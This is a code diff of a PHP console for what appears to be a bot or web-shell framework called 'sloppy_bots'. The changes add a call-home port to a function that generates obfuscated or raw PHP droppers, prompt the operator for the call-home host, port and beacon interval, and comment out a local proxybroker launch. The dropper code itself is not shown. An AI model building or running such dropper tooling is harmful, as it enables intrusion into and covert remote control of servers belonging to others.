@@ -1,5 +1,4 @@
 <?php
-posix_setuid(getmyuid());
 if (strtolower(php_uname()) == "windows") {
     define('clears', 'cls');
 }else{
@@ -16,8 +15,9 @@ $cof = array(
     "password"=>"",
     "dbname"=>"sloppy_bots"
 );
-
-popen("proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High", "r+");
+//todo need to figure out why this is no longer working on raspi
+//$success = null;
+//$te = system("bg $( which bash ) -c 'nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &'", $success);
 is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
 
 try{
@@ -263,10 +263,11 @@ function clo($host, $repo, $uri)
 
 }
 
-function createDropper($callHome, $duration, $obfsucate, $depth)
+function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
 {
     echo "Starting dropper creation\n";
     $file_in = "includes/base.php";
+    $slop = getcwd() . "/slop.php";
     $t = new dynamic_generator();
     if (!empty($callHome) && !empty($duration) && !empty($depth) && !empty($obfsucate)){
         try{
@@ -282,13 +283,13 @@ function createDropper($callHome, $duration, $obfsucate, $depth)
                         $encrypt = false;
                     }
                     print("Generated dropper will be: {$ob}\n");
-                    $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt);
+                    $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, 1000, $slop);
                     system("ls -lah includes/droppers/dynamic/obfuscated");
                     break;
                 case "n":
                     $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
                     print("Generated Dropper will be: {$n}\n");
-                    $t->begin_junk($file_in, "0", $n, "n", false);
+                    $t->begin_junk($file_in, "0", $n, "n", false, $callHome, $callhomePort, 1000, $slop);
                     system("ls -lah includes/droppers/dynamic/raw");
                     break;
             }
@@ -459,6 +460,8 @@ while ($run) {
             system(clears);
             echo("Where are we calling home to? (hostname/ip)->");
             $h_name = trim(fgets(STDIN));
+            echo("Which port are we calling home on?");
+            $h_port = trim(fgets(STDIN));
             echo("How often should we call home? (int) ->");
             $d_int = trim(fgets(STDIN));
             echo("Do we need to obfuscate? (y/n) ->");
@@ -469,7 +472,7 @@ while ($run) {
             }else{
                 $de = "0";
             }
-            createDropper($h_name, $d_int, $osb, $de);
+            createDropper($h_name, $h_port, $d_int, $osb, $de);
             break;
         case "s":
             system(clears);
